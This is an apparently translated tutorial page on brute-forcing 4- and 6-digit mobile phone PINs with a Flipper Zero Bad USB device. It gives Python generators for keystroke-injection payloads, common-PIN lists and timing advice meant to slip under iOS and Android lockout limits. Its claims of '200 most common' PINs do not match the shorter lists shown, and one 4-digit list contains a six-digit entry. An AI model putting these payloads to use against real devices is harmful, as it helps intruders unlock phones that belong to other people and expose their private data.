# Pin Bruteforce

On this page you will learn how to use Bad USB to brute-force PINs on mobile devices, for 4 and 6 digits.

### My payload repository <a href="#mi-repositorio-de-payloads" id="mi-repositorio-de-payloads"></a>

We can use my repository where I have uploaded payloads for 4 and 6 pins. We would just need to download the payloads from the Bad USB folder:

{% embed url="https://github.com/afsh4ck/Flipper-Zero-BadUSB-Pin-Bruteforce" %}

### Payload Generator in Python <a href="#generador-de-payloads-en-python" id="generador-de-payloads-en-python"></a>

We can use the following Python scripts to customize the payloads to our liking.

#### 4-digit PINs <a href="#pins-de-4-digitos" id="pins-de-4-digitos"></a>

The following script generates a payload for 4-digit PINs:

```shellscript
# Generador de DuckyScript para fuerza bruta de PINs
with open("bruteforce_4digit_pin.txt", "w") as f:
    f.write("DEFAULT_DELAY 2000\n")
    for pin in range(10000):  # PINs de 0000 a 9999
        f.write(f"STRING {pin:04d}\n")  # Escribe el PIN con ceros iniciales
        f.write("ENTER\n")
        f.write("DELAY 5000\n")  # Pausa para evitar bloqueos
```

#### 6-digit PINs <a href="#pins-de-6-digitos" id="pins-de-6-digitos"></a>

The following script generates a payload for 6-digit PINs:

```shellscript
# Generador de DuckyScript para fuerza bruta de PINs de 6 dígitos
with open("bruteforce_6digit_pin.txt", "w") as f:
    f.write("DEFAULT_DELAY 2000\n")  # Tiempo inicial de estabilización
    for pin in range(1000000):  # PINs de 000000 a 999999
        f.write(f"STRING {pin:06d}\n")  # Escribe el PIN con ceros iniciales
        f.write("ENTER\n")  # Simula presionar Enter
        f.write("DELAY 5000\n")  # Pausa para evitar bloqueos de intentos rápidos
```

### Common Pin Generator in Python <a href="#generador-de-pins-comunes-en-python" id="generador-de-pins-comunes-en-python"></a>

#### 4-digit PINs <a href="#pins-de-4-digitos-1" id="pins-de-4-digitos-1"></a>

The following script generates a payload with the 200 most common 4-digit PINs:

```shellscript
# Generador de DuckyScript para bruteforce de PINs comunes de 4 dígitos

# Lista inicial de PINs más comunes
common_pins = [
    "1234", "1111", "0000", "1212", "7777", "1004", "2000", "4444", "2222", 
    "6969", "9999", "3333", "5555", "6666", "1122", "1313", "8888", "4321", 
    "1010", "2580", "2019", "1987", "1980", "2468", "1357", "9876", "123456"
]

# Crear archivo DuckyScript
with open("brute_common_4pins.txt", "w") as f:
    f.write("DEFAULT_DELAY 2000\n")  # Tiempo inicial de estabilización
    for pin in common_pins:
        f.write(f"STRING {pin}\n")  # Escribe el PIN más usado o generado
        f.write("ENTER\n")  # Simula presionar Enter
        f.write("DELAY 5000\n")  # Pausa para evitar bloqueos de intentos rápidos
```

#### 6-digit PINs <a href="#pins-de-6-digitos-1" id="pins-de-6-digitos-1"></a>

The following script generates a payload with the 200 most common 6-digit PINs:

<a class="button secondary">Copy</a>

```shellscript
# Generador de DuckyScript para bruteforce de PINs comunes de 6 dígitos

# Lista inicial con los PINs comunes, eliminando duplicados
pins = [
    "123456", "654321", "111111", "000000", "222222", "333333", "444444", 
    "555555", "666666", "777777", "888888", "999999", "121212", "112233", 
    "123123", "101010", "123321", "789456", "147258", "111222", "696969", 
    "000123", "222333", "333444", "123654", "654123", "112211", "223344", 
    "445566", "556677", "667788", "778899", "121121", "343434", "565656", 
    "787878", "909090", "098765", "567890", "456789", "345678", "234567", 
    "987654", "876543", "765432", "210987", "110110", "314159", "271828", 
    "141421"
]

# Crear archivo DuckyScript
with open("brute_common_6pins.txt", "w") as f:
    f.write("DEFAULT_DELAY 2000\n")  # Tiempo inicial de estabilización
    for pin in pins:
        f.write(f"STRING {pin}\n")  # Escribe el PIN
        f.write("ENTER\n")  # Simula presionar Enter
        f.write("DELAY 5000\n")  # Pausa para evitar bloqueos de intentos rápidos
```

## Limitations and recommendations <a href="#limitaciones-y-recomendaciones" id="limitaciones-y-recomendaciones"></a>

#### **1. Blocks and limits in iOS** <a href="#id-1.-bloqueos-y-limites-en-ios" id="id-1.-bloqueos-y-limites-en-ios"></a>

* **Failed Attempts** :
  * iOS has a progressive locking system after several failed attempts.
  * Default:
    * **5 failed attempts** : Temporary 1 minute lockout.
    * **6 failed attempts** : 5-minute lockout.
    * **7 failed attempts** : 15-minute lockout.
    * **8 or more failed attempts** : 1 hour blocks.
  * If the "Erase data" option is enabled, the device will reset after **10 failed attempts** .
* **Automation with an HID keyboard** :
  * iOS treats HID entries as if they were manual, but the blocking behavior remains the same.

#### **2. Blocks and limits in Android** <a href="#id-2.-bloqueos-y-limites-en-android" id="id-2.-bloqueos-y-limites-en-android"></a>

Depending on the age of the OS, they are more or less restrictive:

* **Older versions (< Android 6.0)** :
  * Fewer restrictions on failed attempts; some devices allowed infinite attempts if no additional measures were enabled.
* **Modern versions (Android 10+)** :
  * More robust implementation of progressive limits and automatic locks, integrated with security features such as **FRP (Factory Reset Protection)** to protect the device against unauthorized access.

#### **3. Recommended Waiting Time** <a href="#id-3.-tiempo-de-espera-recomendado" id="id-3.-tiempo-de-espera-recomendado"></a>

To avoid these blockages, consider the following intervals:

* **Attempts per minute** : No more than 5 attempts (one attempt every 12 seconds).
* **Suggested delay** :
  * Minimum: **12000 ms** (12 seconds).
  * Recommended: **15000 ms** (15 seconds), to allow additional time and simulate human behavior.

#### **4. Calculation of Total Time** <a href="#id-4.-calculo-del-tiempo-total" id="id-4.-calculo-del-tiempo-total"></a>

If you are trying **all possible combinations of a 6-digit PIN (1,000,000 combinations) with a 15-second** delay between each attempt:

```shellscript
1,000,000 × 15 segundos = 15,000,000 segundos = 173.6 dias
```

This makes brute-force attacks on modern iOS devices with a 6-digit PIN impractical, as waiting times and lockouts make the process extremely slow.
